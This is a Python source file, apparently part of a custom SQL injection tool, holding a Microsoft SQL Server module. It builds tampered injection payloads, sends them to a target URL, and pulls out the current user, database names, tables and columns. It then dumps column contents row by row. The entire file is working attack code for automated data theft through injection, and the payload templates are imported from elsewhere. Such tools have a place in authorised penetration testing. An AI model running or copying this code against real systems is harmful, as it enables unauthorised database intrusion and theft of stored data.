#! /usr/bin/env python
# -*- coding:utf-8 -*-
# author:flystart
# home:www.flystart.org
# time:2019/7/30


from lib.core.dbs.databases import Databases
from lib.core.common import format_data, match_data, match_all_data,random_str,format_hex,find_success,tamper
from lib.core.request.connection import req
from lib.core.data import conf,logger
from lib.parse.payload import SQL,BOUNDARY,SEP_CHAR
# req = Request(headers,conf.proxies,conf.timeout,method='get')
if conf.flag:
    success_flag = conf.flag
keys=list


class Mssql(Databases):
    def __init__(self,tech):
        Databases.__init__(self,tech)

    def get_value_from_response(self,text,token):
        res = ""
        res = match_data(text,token)
        return res

    def get_payload(self,table_name,col_name,i="1",index="1",value=""): # (index,vaule) is used blind
        cols = []
        token = ":--:"
        for col in col_name:
            cols.append(col)
            cat_str = cols[0]
        boundary = SEP_CHAR + self.boundary.replace('%value',value).replace('%index',index)
        query = self.query.replace('t_n',table_name).replace('%s', cat_str).replace('%d', i)
        boundary,query = tamper(boundary,query)
        payload = boundary
        payload = payload.replace('%query',query)
        payload = format_data(payload)
        if conf.debug:
            logger.success(payload)
        return payload,token

    def get_counts(self,table_name,col_name):
        col_name = ["count(*)"]
        counts = ''
        payload, token = self.get_payload(table_name, col_name, '1')
        url = conf.url
        res = req.connection(url, payload=payload)
        counts =  self.get_value_from_response(res.text,token)
        logger.info("CountsEnties:" + counts)
        return counts

    def get_current_user(self):
        table_name = 'master..sysobjects'
        col_name = ["SYSTEM_USER"]
        user = ""
        payload,token = self.get_payload(table_name,col_name)
        url = conf.url
        res = req.connection(url,payload=payload)
        user= self.get_value_from_response(res.text,token)
        logger.info("CurrentUser:" + user)
        return user


    def get_current_db(self):
        table_name = 'master..sysobjects'
        col_name = ["db_name()"]
        database = ""
        payload,token = self.get_payload(table_name,col_name)
        url = conf.url
        res = req.connection(url,payload=payload)
        database = self.get_value_from_response(res.text,token)
        logger.info("CurrentBase:" + database)
        return database


    def get_dbs(self):
        table_name = 'master..sysdatabases'
        col_name = ["name"]
        self.set_query(SQL.query)
        counts = self.get_counts(table_name,col_name)
        logger.info("all dbs counts is :%s" % counts)
        self.reset_query()
        dbs = []
        for i in range(1,int(counts)+1):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            db = self.get_value_from_response(res.text, token)
            dbs.append(db)
            logger.info("Ent:" + db)
        return dbs

    def get_tables(self,db):
        table_name = 'information_schema.tables'
        col_name = ["table_name"]
        query = SQL.query_all_tab.replace("{db}", "{0}").format(db)
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        logger.info("all tables counts is :%s" % counts)
        query = SQL.query_tab.replace("{db}", "{0}").format(db)
        self.set_query(query)
        tables = []
        for i in range(1,int(counts)+1):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            table = self.get_value_from_response(res.text, token)
            tables.append(table)
            logger.info("Ent:" + table)
        return tables

    def get_columns(self,db,table):
        table_name = '{db}.information_schema.columns'
        col_name = ["column_name"]
        query = SQL.query_all_col.replace("{db}","{0}").replace("{table}","'{1}'").format(db,table)
        self.set_query(query)
        counts = self.get_counts(table_name, col_name)
        query = SQL.query_col.replace("{db}","{0}").replace("{table}","'{1}'").format(db,table)
        self.set_query(query)
        columns = []
        for i in range(1,int(counts)+1):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            col = self.get_value_from_response(res.text, token)
            columns.append(col)
            logger.info("Ent:" + col)
        print columns
        return columns

    def dump(self,db,table,col):
        table_name = '{0}..{1}'.format(db,table)
        col_name = ["{0}".format(col)]
        self.set_query(SQL.query)
        counts = self.get_counts(table_name, col_name)
        self.reset_query()
        data = []
        for i in range(1,int(counts)+1):
            payload, token = self.get_payload(table_name, col_name, str(i))
            url = conf.url
            res = req.connection(url, payload=payload)
            value = self.get_value_from_response(res.text, token)
            logger.info("Ent:{0}.{1}:{2}".format(table_name,col_name,value))
            data.append(value)
        return data
